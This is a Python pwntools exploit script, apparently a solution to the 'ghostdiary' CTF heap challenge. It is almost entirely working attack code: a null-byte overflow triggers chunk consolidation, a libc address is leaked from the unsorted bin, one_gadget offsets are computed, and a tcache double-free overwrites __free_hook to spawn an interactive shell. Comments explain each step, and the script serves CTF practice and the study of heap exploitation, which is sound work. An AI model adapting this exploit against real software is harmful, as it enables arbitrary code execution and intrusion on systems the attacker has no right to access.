from pwn import *

p = process('./ghostdiary_patched', env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF('libc-2.27.so')
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                         continue 
#                                     ''')

def add(size):
    p.sendlineafter("> ", "1")
    
    if size <= 0xf0:
        p.sendlineafter("> ", "1")
    else:
        p.sendlineafter("> ", "2")
    
    p.sendlineafter(": ", str(size))

def talk(page, content):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(page))
    p.sendafter(": ", str(content))

def listen(page):
    p.sendlineafter("> ", "3")
    p.sendlineafter(': ', str(page))
    content = p.recvline().split(': ')[1].strip('\n')
    return content

def free(page):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", str(page))


def solve():
    # prepare 3 chunks
    add(0x128)      # chunk 0
    add(0x118)      # chunk 1
    add(0x118)      # chunk 2

    # fullfill tcache 0xf0
    for i in range(7):
        add(0xf0)
    for i in range(7):
        free(i+3)

    # fullfill tcache 0x128
    for i in range(7):
        add(0x128)
    for i in range(7):
        free(i+3)

    # chunk 0 to unsorted bin
    free(0)

    # Null byte overflow to chunk 2
    talk(1, '1'*0x110 + p64(0x250))

    # create fake chunk in 0x20 after chunk 2 to bypass free check
    talk(2, '2'*0xf8 + p64(0x21) + '\n')

    # free chunk 2 cause backward consolidation
    free(2)
    # Empty the 0x128 tcache bin so we can get chunks out of the unsorted bin
    # Indexes taken up: 0, 2, 3, 4, 5, 6, 7
    for i in range(7):
        add(0x128)

    add(0x128) # idx 8

    # Now since we have a pointer to chunk B, we can leak the the fd pointer
    # Remember the fd pointer just points to `main_arena+0x58`
    libc_leak = u64(listen(1).ljust(8, '\x00'))

    # Calculate needed offsets
    libc.address = libc_leak - 0x3ebca0
    one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]
    one_gadget = libc.address + one_gadget_offset[1]
    free_hook = libc.symbols['__free_hook']
    malloc_hook = libc.symbols['__malloc_hook']
    log.info('main arena leak: ' + hex(libc_leak))
    log.info('Libc base: ' + hex(libc.address))
    log.info('one gadget: ' + hex(one_gadget))
    log.info('free_hook: ' + hex(free_hook))
    log.info('malloc_hook: ' + hex(malloc_hook))
    # Fill up the 0x128 tcache bin again
    # We do this to make subsequent mallocs easier to use
    # It is easier to visualise the indexes in my opinion
    # Indexes freed: 0, 2, 3, 4, 5, 6, 7
    free(0)
    for i in range(2, 8):
        free(i)
    # Add overlapped chunk with 1 with size 0x1d8, this creates a new tcache bin when freed
    # The new tcache bin is used for the tcache poisoning attack
    # Otherwise there are some checks to bypass if we do an fastbin attack (for example)
    # It's just easier to do it with the tcache bins
    add(0x78) # idx 0, overlapped with the starting chunk 1 => now chunk 0 and chunk 1 are in the same address

    free(0) 
    free(1) # double free

    # Write one_gadget to free_hook
    add(0x78)
    talk(0, p64(free_hook) + '\n')
    add(0x78)
    add(0x78)
    talk(2, p64(one_gadget) + '\n')
    
    free(1)
    
    p.interactive()

if __name__ == '__main__':
    solve()